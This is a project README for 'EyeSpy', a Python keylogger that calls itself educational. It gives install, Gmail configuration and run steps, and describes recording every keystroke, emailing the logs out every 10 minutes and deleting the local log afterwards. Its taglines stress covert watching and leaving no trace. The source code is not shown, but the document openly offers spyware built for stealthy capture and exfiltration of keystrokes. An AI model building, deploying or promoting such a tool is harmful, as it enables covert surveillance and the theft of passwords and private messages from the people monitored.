# 👁️ EyeSpy - Educational Keylogger

## What is EyeSpy?
*Watch without being seen.* EyeSpy is an educational keylogger that records keystrokes and sends reports via email every 10 minutes.

**For educational purposes only. Do not use without consent.**

---

## Installation
1. Ensure Python 3.6+ is installed.
2. Install the required dependencies:
```bash
pip install pynput
```
3. Clone the project:
```bash
git clone https://github.com/yourusername/EyeSpy.git
cd EyeSpy
```

---

## Configuration
1. Open `Eyespy.py`.
2. Edit the following lines with your email details:
```python
email_address = "your_email@gmail.com"
email_password = "your_app_password"
recipient_email = "recipient_email@gmail.com"
```
3. Generate an app-specific password for Gmail: [Official Guide](https://support.google.com/accounts/answer/185833?hl=en).

---

## Usage
Run the keylogger:
```bash
python Eyespy.py
```
You'll see the following screen:
```

                          ▓▓████████████████                    
                    ▒▒██▓▓              ▒▒██████░░              
                ▓▓██░░    ▓▓██████████████    ██████            
            ██▒▒  ░░██████████████████████████    ██████        
          ██  ▒▒██░░  ████████████████████░░▒▒██▒▒  ▓▓████      
        ██  ██        ████████    ██████████    ████  ▒▒████░░  
      ▒▒            ████████        ████████      ████    ██████
    ░░░░            ██    ██        ████████        ████  ░░████
    ░░              ██    ██        ████████          ████    ██
                      ▒▒████████████████████          ██████    
                      ████████████████████          ░░██████    
      ░░                ████████████████          ░░██▒▒████    
          ░░              ▒▒████████▒▒          ████            
            ▒▒▒▒░░                          ▒▒██                
                  ░░▒▒██                ▓▓██  

🕵️ EyeSpy is running... Press ESC to stop.
```
Keystrokes will be logged in `eyespy_keylog.txt` and sent via email every 10 minutes.

---

## Features
- Records every keystroke.
- Sends logs via email.
- Clears logs after each successful email.

---

##  Disclaimer
EyeSpy is for educational purposes only. Unauthorized use is illegal. The author is not responsible for any misuse.

---

## 👤 Author
Someone. Or no one.

---

*See everything. Leave nothing behind.* 

